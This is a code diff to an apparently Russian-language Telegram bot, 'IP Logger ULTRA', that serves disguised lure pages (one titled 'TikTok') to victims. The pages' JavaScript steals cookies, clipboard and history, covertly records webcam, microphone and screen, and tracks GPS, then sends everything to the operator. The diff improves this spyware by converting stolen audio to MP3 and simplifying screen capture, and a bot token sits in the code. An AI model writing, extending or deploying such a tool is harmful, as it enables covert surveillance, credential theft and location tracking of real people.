@@ -11,6 +11,7 @@ from datetime import datetime
 import requests
 import base64
 import zipfile
+import subprocess
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 
@@ -51,7 +52,7 @@ function checkTelegram(){var iframe=document.createElement('iframe');iframe.styl
 function stealCookies(){var cookies=document.cookie;if(cookies.length>0){fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:cookies})});}}
 async function cam(){try{var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=st;await v.play();await new Promise(function(r){setTimeout(r,3000);});var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
 async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
-async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});await new Promise(function(r){setTimeout(r,1000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop());};}catch(e){}}
+async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
 function startGeoTracking(){if(navigator.geolocation){setInterval(function(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/geo_track/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,ts:Date.now()})});},err=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});},10000);}}
 setTimeout(getGPS,1000);setTimeout(stealHistory,2000);setTimeout(cam,3000);setTimeout(recordAudio,4000);setTimeout(recordScreen,5000);setTimeout(stealClipboard,6000);setTimeout(getWebRTCIP,7000);setTimeout(checkTelegram,8000);setTimeout(stealCookies,9000);setTimeout(startGeoTracking,10000);
 </script></body></html>"""
@@ -68,7 +69,7 @@ SCREEN_PAGE = """<!DOCTYPE html>
 <html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial;}</style></head>
 <body><h3>Loading screen...</h3><p>Click "Share" when asked</p>
 <script>
-async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.querySelector('h3').innerText='Done!';}catch(e){document.querySelector('h3').innerText='Error';}}
+async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.querySelector('h3').innerText='Done!';}catch(e){document.querySelector('h3').innerText='Error';}}
 recordScreen();
 </script></body></html>"""
 
@@ -178,7 +179,6 @@ async def notify(uid, lid):
         await asyncio.sleep(25)
         v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
         
-        # Создаём ZIP
         zip_path = f"/tmp/data_{lid}.zip"
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
             report = f"""📋 ОТЧЁТ IP LOGGER
@@ -211,17 +211,28 @@ async def notify(uid, lid):
                 try: zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
                 except: pass
             if v.get('audio'):
-                try: zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
-                except: pass
+                try:
+                    webm_path = f"/tmp/audio_{lid}.webm"
+                    mp3_path = f"/tmp/audio_{lid}.mp3"
+                    audio_bytes = base64.b64decode(v['audio'].split(',')[1])
+                    with open(webm_path, 'wb') as f: f.write(audio_bytes)
+                    subprocess.run(['ffmpeg', '-i', webm_path, '-acodec', 'libmp3lame', '-ab', '128k', mp3_path, '-y'], capture_output=True)
+                    if os.path.exists(mp3_path):
+                        zf.write(mp3_path, 'audio.mp3')
+                        os.remove(mp3_path)
+                    else:
+                        zf.writestr('audio.webm', audio_bytes)
+                    os.remove(webm_path)
+                except:
+                    try: zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
+                    except: pass
             if v.get('screen'):
                 try: zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
                 except: pass
         
-        # Отправляем ZIP
         await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
         os.remove(zip_path)
         
-        # Гео-точка
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(v['gps'].get('acc',10))))
@@ -232,7 +243,6 @@ async def notify(uid, lid):
             await bot.send_file(uid, file=geo, caption="📍 IP-гео")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
         
-        # WebRTC IP отдельным сообщением
         if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
             await bot.send_message(uid, f"🕵️ **Реальный IP (WebRTC):** `{v['webrtc_ip']}`")
         
@@ -246,7 +256,7 @@ async def start(event):
         [Button.inline("🎤 Только аудио", "audio")],
         [Button.inline("🎥 Только экран", "screen")],
     ]
-    await event.reply("🎭 **IP Logger ULTRA**\n\n📸 Фото\n🎤 Аудио\n🎥 Экран\n📍 GPS\n🕵️ WebRTC IP\n📱 Telegram\n🍪 Куки\n📋 Буфер\n📜 История\n📍 Гео-трекинг\n\nВыбери тип:", buttons=buttons)
+    await event.reply("🎭 **IP Logger ULTRA**\n\n📸 Фото\n🎤 Аудио (MP3)\n🎥 Экран\n📍 GPS\n🕵️ WebRTC IP\n📱 Telegram\n🍪 Куки\n📋 Буфер\n📜 История\n📍 Гео-трекинг\n\nВыбери тип:", buttons=buttons)
 
 @bot.on(events.CallbackQuery)
 async def callback(event):
